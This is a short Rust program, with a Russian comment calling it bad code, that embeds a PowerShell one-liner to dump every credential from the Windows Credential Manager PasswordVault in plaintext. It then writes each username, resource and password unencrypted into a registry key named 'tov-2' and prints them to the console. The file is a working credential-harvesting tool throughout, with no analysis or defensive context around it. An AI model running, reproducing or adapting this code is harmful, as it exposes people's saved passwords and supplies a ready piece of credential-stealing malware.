extern crate winreg;
use std::io;
use std::path::Path;
use winreg::enums::*;
use winreg::RegKey;


extern crate powershell_script;

fn main() -> io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software").join("tov-2");
    let (key, _) = hkcu.create_subkey(&path)?;
    let query = "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; \
    $vault = New-Object Windows.Security.Credentials.PasswordVault; \
    $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password";
    let output = powershell_script::run(query, false).unwrap().to_string();
    let mut lines: Vec<&str> = output.lines().collect();
    /*
    Говнокод
    */
    lines.remove(0);
    lines.remove(0);
    lines.remove(0);
    lines.remove(lines.len()-1);
    lines.remove(lines.len()-1);
    for line in lines {
        let words : Vec<&str> = line.split_whitespace().collect();
        key.set_value(words[1], &format!("{}:{}",words[0], words[2]))?;
        println!("{}: {}:{}", words[1], words[0], words[2])
    }
    Ok(())
}